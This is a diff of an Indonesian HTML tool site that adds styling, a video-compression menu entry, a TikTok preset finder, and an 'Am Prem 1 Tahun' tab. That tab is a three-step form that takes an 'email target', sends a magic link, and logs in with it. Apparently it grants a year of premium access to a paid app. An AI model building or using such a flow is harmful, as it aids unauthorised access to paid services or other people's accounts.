@@ -309,6 +309,7 @@
         .enhance-control.off input[type="range"]{opacity:.3}
         .enhance-control.off .ctl-name{opacity:.5}
         .btn-res{background:linear-gradient(135deg,#0891b2,#3b82f6);margin-top:12px}
+        .btn-kv{background:linear-gradient(135deg,#16a34a,#0891b2);margin-top:12px}
 
         /* Menu samping (slide kiri) */
         .side{position:fixed;top:0;left:0;bottom:0;width:270px;z-index:60;display:flex;flex-direction:column;padding:18px 14px;background:linear-gradient(180deg,rgba(10,14,26,.92),rgba(8,11,22,.96));-webkit-backdrop-filter:blur(18px);backdrop-filter:blur(18px);border-right:1px solid rgba(59,130,246,.25);overflow-y:auto;transition:transform .28s ease}
@@ -331,6 +332,8 @@
         .dl-row a.tt-mini{display:flex;align-items:center;text-decoration:none;white-space:nowrap}
 
         /* Beranda */
+        .home-clock{display:flex;align-items:center;justify-content:center;min-height:38vh}
+        .home-clock-time{font-family:'Space Mono',monospace;font-size:clamp(40px,13vw,76px);font-weight:700;color:#fff;letter-spacing:2px;font-variant-numeric:tabular-nums;text-shadow:0 0 26px rgba(59,130,246,.5)}
         .hero{position:relative;text-align:center;padding:26px 12px 22px;border-radius:16px;background:radial-gradient(circle at 50% 0%,rgba(239,28,28,.18),transparent 64%);margin-bottom:18px}
         .hero h2{margin:6px 0 10px;font-size:24px}
         .hero p{color:var(--text-gray);font-size:14px;line-height:1.7;max-width:580px;margin:0 auto}
@@ -372,7 +375,253 @@
         @keyframes freeNote{to{opacity:.85}}
         @media (prefers-reduced-motion:reduce){.tagline.free,.free-line{animation:none}.free-note{animation:none;opacity:.85}}
         .rel-info{margin-top:10px;font-size:12px;color:var(--text-gray);line-height:1.6;text-align:center}
-    </style>
+    
+        /* ===== PANEL STYLES ===== */
+        :root {
+            --mint: #A8E6A3; --mint-dark: #7BC977; --yellow-dpr: #FFD93D;
+            --pink-dpr: #FF9ECD; --blue-dpr: #5BA3FF; --ink: #0A0A0A;
+            --ink-soft: #B8B8B8; --gray-dpr: #6A6A6A; --red-dpr: #FF6B6B;
+            --accent-dpr: var(--mint); --accent-dark-dpr: var(--mint-dark);
+            --shadow-sm-dpr: 0 2px 8px rgba(168,230,163,.15);
+            --shadow-md-dpr: 0 4px 16px rgba(168,230,163,.2);
+            --shadow-lg-dpr: 0 8px 32px rgba(168,230,163,.25);
+            --radius-sm-dpr: 8px; --radius-md-dpr: 14px;
+            --radius-lg-dpr: 20px; --radius-full-dpr: 100px;
+        }
+        .dpr-panel-section { margin-top: 0; }
+        .dpr-card {
+            background: linear-gradient(145deg, rgba(168,230,163,0.08), rgba(10,14,26,0.95));
+            border: 1px solid rgba(168,230,163,0.25); border-radius: 20px;
+            padding: 24px; margin-bottom: 24px;
+        }
+        .dpr-badge {
+            display: inline-flex; align-items: center; gap: 8px;
+            padding: 8px 16px; background: rgba(10,10,10,0.6);
+            border: 2px solid var(--mint); border-radius: var(--radius-full-dpr);
+            font-family: 'Space Mono', monospace; font-size: 11px;
+            font-weight: 700; letter-spacing: 1px; margin-bottom: 16px;
+            color: var(--mint);
+        }
+        .dpr-badge .dot {
+            width: 8px; height: 8px; background: var(--mint); border-radius: 50%;
+            animation: dpr-pulse 1.6s ease-in-out infinite;
+        }
+        @keyframes dpr-pulse { 0%,100%{transform:scale(1);opacity:1;} 50%{transform:scale(1.3);opacity:.6;} }
+        .dpr-info-row { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; }
+        .dpr-info-card {
+            flex: 1; min-width: 130px; padding: 12px 16px;
+            background: rgba(10,10,10,0.5); border: 1px solid rgba(168,230,163,0.2);
+            border-radius: var(--radius-md-dpr);
+        }
+        .dpr-info-card .lbl {
+            font-family: 'Space Mono', monospace; font-size: 10px; font-weight: 700;
+            color: var(--gray-dpr); letter-spacing: 1.5px; margin-bottom: 6px; text-transform: uppercase;
+        }
+        .dpr-info-card .val {
+            font-family: 'Space Mono', monospace; font-size: 18px; font-weight: 700;
+            color: var(--mint); letter-spacing: 1px; font-variant-numeric: tabular-nums;
+        }
+        .dpr-stat-card {
+            background: rgba(10,10,10,0.5); border: 1px solid rgba(168,230,163,0.2);
+            border-radius: var(--radius-lg-dpr); padding: 18px; margin-bottom: 16px;
+            position: relative; overflow: hidden;
+        }
+        .dpr-stat-card::before {
+            content:''; position:absolute; top:0; left:0; right:0; height:3px;
+            background: linear-gradient(90deg, var(--mint), var(--yellow-dpr), var(--pink-dpr), var(--blue-dpr));
+        }
+        .dpr-stat-card .head { display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; }
+        .dpr-stat-card .lbl { font-family:'Space Mono',monospace; font-size:11px; font-weight:700; color:var(--gray-dpr); letter-spacing:1.5px; text-transform:uppercase; }
+        .dpr-stat-card .ic { width:40px; height:40px; background:var(--mint); border-radius:10px; display:flex; align-items:center; justify-content:center; }
+        .dpr-stat-card .ic svg { width:20px; height:20px; stroke:var(--ink); stroke-width:2.5; fill:none; stroke-linecap:round; stroke-linejoin:round; }
+        .dpr-stat-card .num { font-family:'Space Mono',monospace; font-size:36px; font-weight:700; color:#fff; line-height:1; margin-bottom:12px; letter-spacing:-1px; font-variant-numeric:tabular-nums; }
+        .dpr-stat-row { display:flex; gap:8px; flex-wrap:wrap; }
+        .dpr-stat-badge { display:inline-flex; align-items:center; gap:6px; padding:6px 12px; border:1px solid rgba(59,130,246,0.2); border-radius:var(--radius-full-dpr); font-family:'Space Mono',monospace; font-size:10px; font-weight:700; letter-spacing:.3px; }
+        .dpr-stat-badge svg { width:12px; height:12px; stroke-width:3; fill:none; stroke-linecap:round; stroke-linejoin:round; }
+        .dpr-stat-badge.success { background:rgba(168,230,163,.12); color:var(--mint); }
+        .dpr-stat-badge.success svg { stroke:var(--mint); }
+        .dpr-stat-badge.error { background:rgba(255,107,107,.12); color:var(--red-dpr); }
+        .dpr-stat-badge.error svg { stroke:var(--red-dpr); }
+        .dpr-stat-badge.all { background:rgba(91,163,255,.12); color:var(--blue-dpr); }
+        .dpr-stat-badge.all svg { stroke:var(--blue-dpr); }
+        .dpr-community-card {
+            background: rgba(10,10,10,0.4); border: 1px solid rgba(168,230,163,0.2);
+            border-radius: var(--radius-lg-dpr); padding: 18px; margin-bottom: 16px;
+        }
+        .dpr-community-card h3 { font-size:16px; font-weight:900; display:flex; align-items:center; gap:10px; margin-bottom:8px; color:#fff; }
+        .dpr-community-card h3 .dot { width:10px; height:10px; background:var(--mint); border-radius:50%; }
+        .dpr-community-card p { font-size:13px; line-height:1.5; color:var(--text-gray); margin-bottom:14px; }
+        .dpr-community-card .row { display:flex; gap:10px; flex-wrap:wrap; }
+        .dpr-btn-social { flex:1; min-width:120px; padding:12px 16px; border-radius:var(--radius-md-dpr); font-size:13px; font-weight:800; display:flex; align-items:center; justify-content:center; gap:8px; text-decoration:none; color:var(--ink); transition:all .2s; border:none; cursor:pointer; }
+        .dpr-btn-social:active { transform:scale(.97); }
+        .dpr-btn-social.wa { background:var(--mint); color:var(--ink); }
+        .dpr-btn-social.tg { background:var(--blue-dpr); color:#fff; }
+        /* DPR Tabs */
+        .dpr-tabs { display:flex; gap:6px; margin-bottom:16px; padding:6px; background:rgba(10,10,10,0.5); border:1px solid rgba(168,230,163,0.15); border-radius:var(--radius-md-dpr); }
+        .dpr-tab { flex:1; padding:12px; background:transparent; border:none; border-radius:10px; font-size:13px; font-weight:800; display:flex; align-items:center; justify-content:center; gap:8px; color:var(--gray-dpr); transition:all .18s; letter-spacing:-.2px; cursor:pointer; font-family:inherit; }
+        .dpr-tab svg { width:16px; height:16px; stroke:currentColor; stroke-width:2.5; fill:none; stroke-linecap:round; stroke-linejoin:round; }
+        .dpr-tab.active { background:var(--mint); color:var(--ink); }
+        .dpr-tab:not(.active):hover { background:rgba(168,230,163,0.1); }
+        .dpr-tab-content { display:none; }
+        .dpr-tab-content.active { display:block; animation:dpr-fadeUp .4s; }
+        @keyframes dpr-fadeUp { from{opacity:0;transform:translateY(8px);} to{opacity:1;transform:translateY(0);} }
+        /* Steps */
+        .dpr-steps { display:flex; align-items:center; gap:8px; margin-bottom:20px; }
+        .dpr-step-dot { width:34px; height:34px; border-radius:50%; background:rgba(10,10,10,0.5); border:1px solid rgba(168,230,163,0.2); display:flex; align-items:center; justify-content:center; font-family:'Space Mono',monospace; font-size:13px; font-weight:700; color:var(--gray-dpr); transition:all .3s; }
+        .dpr-step-dot.active { background:var(--mint); border-color:var(--mint); color:var(--ink); }
+        .dpr-step-dot.done { background:rgba(168,230,163,0.1); border-color:var(--mint); color:var(--mint); }
+        .dpr-step-line { flex:1; height:2px; background:rgba(168,230,163,0.15); position:relative; }
+        .dpr-step-line::after { content:''; position:absolute; left:0; top:0; height:100%; width:0; background:var(--mint); transition:width .3s; }
+        .dpr-step-line.done::after { width:100%; }
+        /* DPR Input */
+        .dpr-input-group { margin-bottom:18px; }
+        .dpr-input-label { font-family:'Space Mono',monospace; font-size:11px; font-weight:700; color:var(--gray-dpr); letter-spacing:1.5px; margin-bottom:8px; display:flex; align-items:center; gap:8px; text-transform:uppercase; }
+        .dpr-input-label .num { width:22px; height:22px; background:var(--mint); border-radius:6px; display:flex; align-items:center; justify-content:center; font-size:11px; color:var(--ink); }
+        .dpr-input-shell { position:relative; background:rgba(10,10,10,0.6); border:1px solid rgba(168,230,163,0.2); border-radius:var(--radius-md-dpr); transition:all .2s; }
+        .dpr-input-shell:focus-within { border-color:var(--mint); box-shadow:var(--shadow-sm-dpr); }
+        .dpr-input-shell.err { border-color:var(--red-dpr); animation:dpr-shake .4s; }
+        @keyframes dpr-shake { 0%,100%{transform:translateX(0);} 25%{transform:translateX(-6px);} 75%{transform:translateX(6px);} }
+        .dpr-input-shell input { width:100%; padding:14px 16px; font-size:15px; font-weight:600; color:#fff; background:transparent; border:none; outline:none; font-family:inherit; }
+        .dpr-input-shell input::placeholder { color:var(--gray-dpr); font-weight:400; }
+        .dpr-input-hint { font-size:12px; margin-top:6px; padding-left:4px; color:var(--gray-dpr); }
+        .dpr-input-hint.ok { color:var(--mint); }
+        .dpr-input-hint.warn { color:var(--yellow-dpr); }
+        /* DPR Buttons */
+        .dpr-btn { width:100%; padding:15px 24px; border-radius:var(--radius-md-dpr); font-size:15px; font-weight:800; display:flex; align-items:center; justify-content:center; gap:10px; transition:all .15s; letter-spacing:-.2px; border:none; cursor:pointer; font-family:inherit; }
+        .dpr-btn:active { transform:scale(.98); }
+        .dpr-btn:disabled { opacity:.4; cursor:not-allowed; transform:none; }
+        .dpr-btn-primary { background:var(--mint); color:var(--ink); }
+        .dpr-btn-primary:not(:disabled):hover { background:var(--mint-dark); }
+        .dpr-btn-secondary { background:rgba(10,10,10,0.5); color:#fff; border:1px solid rgba(168,230,163,0.2) !important; }
+        .dpr-btn-secondary:not(:disabled):hover { border-color:var(--mint) !important; }
+        .dpr-btn svg { width:20px; height:20px; stroke:currentColor; stroke-width:2.5; fill:none; stroke-linecap:round; stroke-linejoin:round; }
+        .dpr-btn-loader { width:20px; height:20px; border:3px solid rgba(0,0,0,.2); border-top-color:currentColor; border-radius:50%; animation:dpr-spin .8s linear infinite; }
+        @keyframes dpr-spin { to{transform:rotate(360deg);} }
+        /* DPR Cooldown */
+        .dpr-cooldown-box { display:none; background:rgba(10,10,10,0.5); border:1px solid var(--yellow-dpr); border-radius:var(--radius-md-dpr); padding:16px; margin-bottom:16px; text-align:center; }
+        .dpr-cooldown-box.on { display:block; animation:dpr-fadeUp .3s; }
+        .dpr-cooldown-timer { font-family:'Space Mono',monospace; font-size:32px; font-weight:700; color:var(--yellow-dpr); margin-bottom:6px; font-variant-numeric:tabular-nums; }
+        .dpr-cooldown-bar { height:5px; background:rgba(255,217,61,0.15); border-radius:3px; overflow:hidden; margin-bottom:8px; }
+        .dpr-cooldown-bar-fill { height:100%; background:var(--yellow-dpr); border-radius:3px; transition:width 1s linear; }
+        .dpr-cooldown-msg { font-size:12px; color:var(--text-gray); }
+        /* DPR Result Card */
+        .dpr-result-card { background:rgba(10,10,10,0.5); border:1px solid rgba(168,230,163,0.2); border-radius:var(--radius-lg-dpr); padding:18px; margin-bottom:16px; }
+        .dpr-result-title { font-family:'Space Mono',monospace; font-size:11px; font-weight:700; color:var(--gray-dpr); letter-spacing:1.5px; margin-bottom:14px; text-transform:uppercase; display:flex; align-items:center; gap:8px; }
+        .dpr-result-title::before { content:''; width:8px; height:8px; background:var(--mint); border-radius:50%; }
+        .dpr-result-row { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid rgba(168,230,163,0.08); }
+        .dpr-result-row:last-child { border-bottom:none; }
+        .dpr-result-row .k { font-family:'Space Mono',monospace; font-size:11px; font-weight:700; color:var(--gray-dpr); letter-spacing:1px; }
+        .dpr-result-row .v { font-size:14px; font-weight:700; color:#fff; text-align:right; max-width:60%; word-break:break-all; }
+        .dpr-result-row .v.mono { font-family:'Space Mono',monospace; font-size:12px; color:var(--mint); }
+        .dpr-result-row .v.badge-v { background:var(--mint); color:var(--ink); padding:3px 10px; border-radius:var(--radius-full-dpr); font-size:12px; }
+        /* Preset Card */
+        .dpr-preset-card { background:rgba(10,10,10,0.4); border:1px solid rgba(168,230,163,0.2); border-radius:var(--radius-md-dpr); padding:14px; margin-bottom:10px; display:flex; align-items:center; gap:12px; }
+        .dpr-preset-card:hover { border-color:var(--mint); }
+        .dpr-preset-icon { width:44px; height:44px; background:var(--mint); border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:20px; flex-shrink:0; }
+        .dpr-preset-info { flex:1; min-width:0; }
+        .dpr-preset-name { font-size:14px; font-weight:800; color:#fff; margin-bottom:3px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+        .dpr-preset-meta { font-size:12px; color:var(--gray-dpr); font-family:'Space Mono',monospace; }
+        .dpr-preset-btn { width:38px; height:38px; background:rgba(10,10,10,0.5); border:1px solid rgba(168,230,163,0.2); border-radius:8px; display:flex; align-items:center; justify-content:center; text-decoration:none; transition:all .2s; flex-shrink:0; }
+        .dpr-preset-btn:hover { background:var(--mint); }
+        .dpr-preset-btn svg { width:16px; height:16px; stroke:#fff; stroke-width:2; fill:none; stroke-linecap:round; stroke-linejoin:round; }
+        .dpr-preset-btn:hover svg { stroke:var(--ink); }
+        /* Video Info */
+        .dpr-video-info { background:rgba(10,10,10,0.4); border:1px solid rgba(168,230,163,0.15); border-radius:var(--radius-md-dpr); padding:14px; margin-bottom:14px; }
+        .dpr-video-header { display:flex; align-items:center; gap:10px; margin-bottom:10px; }
+        .dpr-video-avatar { width:40px; height:40px; background:rgba(10,10,10,0.5); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:16px; overflow:hidden; }
+        .dpr-video-avatar img { width:100%; height:100%; object-fit:cover; }
+        .dpr-video-author { font-size:15px; font-weight:800; color:#fff; }
+        .dpr-video-desc { font-size:13px; color:var(--text-gray); line-height:1.5; margin-bottom:10px; }
+        .dpr-video-stats { display:flex; gap:14px; font-size:12px; color:var(--gray-dpr); font-family:'Space Mono',monospace; }
+        /* DPR Toast */
+        .dpr-toast-wrap { position:fixed; top:20px; left:50%; transform:translateX(-50%); z-index:1200; display:flex; flex-direction:column; gap:10px; width:calc(100% - 32px); max-width:400px; pointer-events:none; }
+        .dpr-toast { display:flex; align-items:center; gap:12px; padding:14px 18px; background:rgba(17,24,39,0.95); border:1px solid rgba(59,130,246,0.2); border-radius:var(--radius-md-dpr); box-shadow:var(--shadow-lg-dpr); transform:translateY(-100px); opacity:0; transition:all .3s cubic-bezier(.22,1.5,.36,1); pointer-events:auto; backdrop-filter:blur(12px); }
+        .dpr-toast.on { transform:translateY(0); opacity:1; }
+        .dpr-toast .ic { width:30px; height:30px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:14px; font-weight:900; flex-shrink:0; }
+        .dpr-toast.success .ic { background:var(--mint); color:var(--ink); }
+        .dpr-toast.error .ic { background:var(--red-dpr); color:#fff; }
+        .dpr-toast.info .ic { background:var(--blue-dpr); color:#fff; }
+        .dpr-toast.warn .ic { background:var(--yellow-dpr); color:var(--ink); }
+        .dpr-toast .t { font-size:14px; font-weight:800; color:#fff; }
+        .dpr-toast .m { font-size:12px; color:var(--text-gray); margin-top:2px; }
+        /* Loading */
+        .dpr-loading-overlay { position:fixed; inset:0; background:rgba(10,10,10,.92); backdrop-filter:blur(8px); z-index:1100; display:none; align-items:center; justify-content:center; }
+        .dpr-loading-overlay.on { display:flex; }
+        .dpr-loading-box { text-align:center; padding:40px; }
+        .dpr-loading-spinner { width:56px; height:56px; border:4px solid rgba(168,230,163,0.15); border-top-color:var(--mint); border-radius:50%; animation:dpr-spin 1s linear infinite; margin:0 auto 18px; }
+        .dpr-loading-title { font-size:18px; font-weight:900; color:#fff; margin-bottom:6px; }
+        .dpr-loading-sub { font-size:13px; color:var(--gray-dpr); font-family:'Space Mono',monospace; }
+        /* Confetti */
+        .dpr-confetti { position:fixed; inset:0; pointer-events:none; z-index:1099; display:none; }
+        .dpr-confetti.on { display:block; }
+        /* Greeting */
+        .dpr-greeting { font-size:22px; font-weight:900; line-height:1.1; letter-spacing:-.5px; padding:12px 18px; background:linear-gradient(135deg, var(--mint) 0%, var(--mint-dark) 100%); border-radius:var(--radius-md-dpr); display:inline-block; margin-bottom:12px; color:var(--ink); }
+        .dpr-greeting-desc { font-size:13px; line-height:1.6; color:var(--text-gray); margin-bottom:16px; }
+        .dpr-greeting-desc b { font-weight:800; color:#fff; }
+        @media(max-width:480px){.dpr-greeting{font-size:18px;padding:10px 14px;}.dpr-stat-card .num{font-size:28px;}}
+
+        /* ===== MattXavieraTools Blue Theme Override for Am Prem & AM Finder ===== */
+        #tab-magic-link .dpr-card,
+        #tab-am-finder .dpr-card {
+            border-color: rgba(59,130,246,0.25);
+            background: linear-gradient(145deg, rgba(30,58,138,0.10), rgba(10,14,26,0.95));
+        }
+        #tab-magic-link .dpr-badge,
+        #tab-am-finder .dpr-badge {
+            border-color: var(--blue-glow); color: var(--blue-light);
+        }
+        #tab-magic-link .dpr-badge .dot,
+        #tab-am-finder .dpr-badge .dot {
+            background: var(--blue-glow);
+        }
+        #tab-magic-link .dpr-btn-primary,
+        #tab-am-finder .dpr-btn-primary {
+            background: linear-gradient(135deg, var(--blue-primary), var(--blue-glow));
+            color: #fff;
+        }
+        #tab-magic-link .dpr-btn-primary:not(:disabled):hover,
+        #tab-am-finder .dpr-btn-primary:not(:disabled):hover {
+            background: linear-gradient(135deg, #1d4ed8, var(--blue-light));
+            box-shadow: 0 6px 20px rgba(59,130,246,0.3);
+        }
+        #tab-magic-link .dpr-step-dot.active,
+        #tab-am-finder .dpr-step-dot.active {
+            background: var(--blue-glow); border-color: var(--blue-glow); color: #fff;
+        }
+        #tab-magic-link .dpr-step-dot.done,
+        #tab-am-finder .dpr-step-dot.done {
+            border-color: var(--blue-glow); color: var(--blue-glow);
+            background: rgba(59,130,246,0.1);
+        }
+        #tab-magic-link .dpr-step-line::after,
+        #tab-am-finder .dpr-step-line::after { background: var(--blue-glow); }
+        #tab-magic-link .dpr-input-shell:focus-within,
+        #tab-am-finder .dpr-input-shell:focus-within {
+            border-color: var(--blue-glow);
+            box-shadow: 0 2px 8px rgba(59,130,246,0.15);
+        }
+        #tab-magic-link .dpr-input-hint.ok,
+        #tab-am-finder .dpr-input-hint.ok { color: var(--blue-light); }
+        #tab-magic-link .dpr-stat-card::before,
+        #tab-am-finder .dpr-stat-card::before {
+            background: linear-gradient(90deg, var(--blue-primary), var(--blue-glow), var(--blue-light));
+        }
+        #tab-magic-link .dpr-cooldown-box,
+        #tab-am-finder .dpr-cooldown-box {
+            border-color: var(--blue-glow);
+        }
+        #tab-magic-link .dpr-result-card,
+        #tab-am-finder .dpr-result-card {
+            border-color: rgba(59,130,246,0.25);
+        }
+        #tab-magic-link .dpr-result-title,
+        #tab-am-finder .dpr-result-title { color: var(--blue-light); }
+        #tab-magic-link .dpr-result-row .v.badge-v,
+        #tab-am-finder .dpr-result-row .v.badge-v {
+            background: rgba(59,130,246,0.15); border-color: rgba(59,130,246,0.4); color: var(--blue-light);
+        }
+</style>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="bg-orbs"><i></i><i></i><i></i></div>
@@ -385,6 +634,7 @@
         <button class="tab-btn active" data-tab="home">🏠 Beranda</button>
         <div class="side-grp">Video</div>
         <button class="tab-btn" data-tab="patch">🚀 Patch</button>
+        <button class="tab-btn" data-tab="kompres">🗜️ Kompres Video</button>
         <button class="tab-btn" data-tab="analyzer">🔍 Analyzer Video Internal</button>
         <button class="tab-btn" data-tab="tiktok">🎵 TikTok Analyzer</button>
         <div class="side-grp">Download</div>
@@ -394,6 +644,9 @@
         <div class="side-grp">Foto</div>
         <button class="tab-btn" data-tab="photo">🖼️ Enhance Foto</button>
         <button class="tab-btn" data-tab="resolution">📐 Ubah Resolusi</button>
+        <div class="side-grp">Akses</div>
+        <button class="tab-btn" data-tab="magic-link">🔑 Am Prem 1 Tahun</button>
+        <button class="tab-btn" data-tab="am-finder">🔍 AM Finder</button>
     </nav>
 
     <div class="container">
@@ -426,73 +679,109 @@
             </div>
 
 
-            <div class="tab-content active" id="tab-home">
+            
+            <!-- ===== AM PREM 1 TAHUN TAB ===== -->
+            <div class="tab-content" id="tab-magic-link">
+                <div class="dpr-card">
+                    <div class="dpr-badge"><span class="dot"></span><span>AM PREM 1 TAHUN</span></div>
+                    <div class="dpr-steps">
+                        <div class="dpr-step-dot active" id="dprDot1">1</div>
+                        <div class="dpr-step-line" id="dprLine1"></div>
+                        <div class="dpr-step-dot" id="dprDot2">2</div>
+                        <div class="dpr-step-line" id="dprLine2"></div>
+                        <div class="dpr-step-dot" id="dprDot3">3</div>
+                    </div>
+                    <!-- Panel 1: Email -->
+                    <div id="dprPanel1" style="display:block;">
+                        <div class="dpr-input-group">
+                            <div class="dpr-input-label"><span class="num">1</span> Masukkan Email</div>
+                            <div class="dpr-input-shell" id="dprEmailShell">
+                                <input type="email" id="dprEmailInput" placeholder="email target" autocomplete="off">
+                            </div>
+                            <div class="dpr-input-hint" id="dprEmailHint">Pastikan email valid &amp; aktif</div>
+                        </div>
+                        <button class="dpr-btn dpr-btn-primary" id="dprBtnSend" disabled>
+                            <svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+                            Kirim Magic Link
+                        </button>
+                    </div>
+                    <!-- Panel 2: Magic Link URL -->
+                    <div id="dprPanel2" style="display:none;">
+                        <div class="dpr-input-group">
+                            <div class="dpr-input-label"><span class="num">2</span> Link Magic</div>
+                            <div class="dpr-input-shell" id="dprMlShell">
+                                <input type="url" id="dprMlInput" placeholder="paste url magic link" autocomplete="off">
+                            </div>
+                            <div class="dpr-input-hint" id="dprMlHint">URL harus http:// atau https://</div>
+                        </div>
+                        <div style="display:flex;gap:10px;">
+                            <button class="dpr-btn dpr-btn-secondary" id="dprBtnBack1" style="flex:1;">
+                                <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                                Kembali
+                            </button>
+                            <button class="dpr-btn dpr-btn-primary" id="dprBtnVerify" style="flex:2;" disabled>
+                                <svg viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"></path><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>
+                                Verifikasi &amp; Login
+                            </button>
+                        </div>
+                    </div>
+                    <!-- Panel 3: Result -->
+                    <div id="dprPanel3" style="display:none;">
+                        <div class="dpr-result-card">
+                            <div class="dpr-result-title">Hasil Verifikasi</div>
+                            <div id="dprResultRows"></div>
+                        </div>
+                        <div style="display:flex;gap:10px;flex-wrap:wrap;">
+                            <button class="dpr-btn dpr-btn-secondary" id="dprBtnCopy" style="flex:1;min-width:90px;">
+                                <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                                Copy
+                            </button>
+                            <button class="dpr-btn dpr-btn-secondary" id="dprBtnDownload" style="flex:1;min-width:90px;">
+                                <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+                                Download
+                            </button>
+                            <button class="dpr-btn dpr-btn-primary" id="dprBtnRestart" style="flex:1;min-width:90px;">
+                                <svg viewBox="0 0 24 24"><path d="M3 12a9 9 0 1 0 3-6.7L3 8"></path><polyline points="3 3 3 8 8 8"></polyline></svg>
+                                Ulangi
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- ===== END AM PREM 1 TAHUN TAB ===== -->
+
+            <!-- ===== AM FINDER TAB ===== -->
+            <div class="tab-content" id="tab-am-finder">
+                <div class="dpr-card">
+                    <div class="dpr-badge"><span class="dot"></span><span>AM FINDER</span></div>
+                    <div class="dpr-cooldown-box" id="dprCooldownBox" style="display:none!important;">
+                        <div class="dpr-cooldown-timer" id="dprCooldownTimer">00:00</div>
+                        <div class="dpr-cooldown-bar"><div class="dpr-cooldown-bar-fill" id="dprCooldownBar" style="width:0%"></div></div>
+                        <div class="dpr-cooldown-msg" id="dprCooldownMsg"></div>
+                    </div>
+                    <div class="dpr-input-group">
+                        <div class="dpr-input-label"><span class="num">&#128269;</span> Link Video TikTok</div>
+                        <div class="dpr-input-shell" id="dprTtShell">
+                            <input type="url" id="dprTtInput" placeholder="paste url video" autocomplete="off">
+                        </div>
+                        <div class="dpr-input-hint" id="dprTtHint">Contoh: https://vt.tiktok.com/ZSbmR9kCu/</div>
+                    </div>
+                    <button class="dpr-btn dpr-btn-primary" id="dprBtnFind" disabled>
+                        <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                        Cari Preset
+                    </button>
+                    <div id="dprAmResult" style="margin-top:18px;"></div>
+                </div>
+            </div>
+            <!-- ===== END AM FINDER TAB ===== -->
+
+<div class="tab-content active" id="tab-home">
                 <div class="hero">
                     <div class="g666-wrap" aria-hidden="true"><span class="g666" data-text="666">666</span></div>
                     <h2 id="greet">Halo, selamat datang!</h2>
-                    <p>Terima kasih sudah mampir di <b>MattXavieraTools</b>. Di sini kamu bisa memperbaiki &amp; menganalisis video, mengunduh video TikTok, sampai mempertajam dan memperbesar foto, semuanya gratis. Mau pakai apa hari ini? Pilih fiturnya di bawah, atau buka menu <b>☰</b> di kiri.</p>
+                    <p>Selamat datang di <b>MattXavieraTools</b> — pilih fitur dari menu <b>☰</b> di kiri untuk mulai.</p>
                 </div>
-                <div class="howto">
-                    <h3>📖 Cara pakai singkat</h3>
-                    <ol>
-                        <li>Pilih fitur yang kamu butuhkan dari kartu di bawah atau dari menu samping.</li>
-                        <li>Upload file (video/foto) atau tempel link, sesuai petunjuk di tiap fitur.</li>
-                        <li>Tekan tombol prosesnya, tunggu selesai, lalu download hasilnya.</li>
-                    </ol>
-                    <p class="howto-note">🔒 Patch, Analyzer, Enhance Foto, dan Ubah Resolusi diproses di perangkatmu, file tidak diupload ke server. Fitur berbasis link (TikTok Analyzer &amp; Download Video) memakai layanan pihak ketiga (tikwm.com) untuk membaca info video.</p>
-                </div>
-                <h3 class="home-h">Mau pakai apa?</h3>
-                <div class="home-grid">
-                    <button class="fcard" type="button" data-go="patch">
-                        <div class="ft">🚀 Patch</div>
-                        <div class="fd">Perbaiki &amp; siapkan video MP4 supaya rapi di TikTok: inject watermark, fix metadata, FPS Boost 60, atau re-encode Ultra HD / 120 FPS.</div>
-                        <div class="fh"><b>Cara:</b> Upload MP4 → atur opsi → tekan Patch → download hasilnya.</div>
-                        <div class="fgo">Buka fitur →</div>
-                    </button>
-                    <button class="fcard" type="button" data-go="analyzer">
-                        <div class="ft">🔍 Analyzer Video Internal</div>
-                        <div class="fd">Bedah file MP4-mu: resolusi, fps, bitrate, GOP, codec, audio, warna/HDR.</div>
-                        <div class="fh"><b>Cara:</b> Upload MP4 → tekan Analyze Video.</div>
-                        <div class="fgo">Buka fitur →</div>
-                    </button>
-                    <button class="fcard" type="button" data-go="tiktok">
-                        <div class="ft">🎵 TikTok Analyzer</div>
-                        <div class="fd">Analisis video TikTok langsung dari link, tanpa download file, lengkap dengan statistik &amp; engagement.</div>
-                        <div class="fh"><b>Cara:</b> Tempel link TikTok → Analisis dari Link.</div>
-                        <div class="fgo">Buka fitur →</div>
-                    </button>
-                    <button class="fcard" type="button" data-go="ext">
-                        <div class="ft">🧩 Download Ekstensi</div>
-                        <div class="fd">Unduh extension MattXavieraTools (ZIP) untuk browser.</div>
-                        <div class="fh"><b>Cara:</b> Download ZIP → ekstrak → Load unpacked di chrome://extensions.</div>
-                        <div class="fgo">Buka fitur →</div>
-                    </button>
-                    <button class="fcard" type="button" data-go="download">
-                        <div class="ft">⬇️ Download Video</div>
-                        <div class="fd">Simpan video TikTok (HD tanpa watermark, Normal, audio MP3) atau link .mp4 langsung.</div>
-                        <div class="fh"><b>Cara:</b> Tempel link → Ambil Video → pilih file yang mau diunduh.</div>
-                        <div class="fgo">Buka fitur →</div>
-                    </button>
-                    <button class="fcard" type="button" data-go="apk">
-                        <div class="ft">📱 Download APK</div>
-                        <div class="fd">Unduh aplikasi Android MattXavieraTools (file APK).</div>
-                        <div class="fh"><b>Cara:</b> Download APK → buka file → izinkan instalasi → instal.</div>
-                        <div class="fgo">Buka fitur →</div>
